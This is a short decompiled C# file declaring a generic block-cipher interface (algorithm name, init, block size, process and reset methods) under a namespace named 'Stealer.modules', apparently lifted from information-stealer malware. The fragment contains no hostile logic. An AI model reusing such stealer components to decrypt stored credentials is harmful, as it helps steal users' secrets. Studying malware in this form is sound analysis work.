using System;

namespace Stealer.modules
{
	// Token: 0x02000010 RID: 16
	public interface IBlockCipher
	{
		// Token: 0x17000004 RID: 4
		// (get) Token: 0x0600005A RID: 90
		string AlgorithmName { get; }

		// Token: 0x17000005 RID: 5
		// (get) Token: 0x0600005B RID: 91
		bool IsPartialBlockOkay { get; }

		// Token: 0x0600005C RID: 92
		void Init(bool forEncryption, ICipherParameters parameters);

		// Token: 0x0600005D RID: 93
		int GetBlockSize();

		// Token: 0x0600005E RID: 94
		int ProcessBlock(byte[] inBuf, int inOff, byte[] outBuf, int outOff);

		// Token: 0x0600005F RID: 95
		void Reset();
	}
}
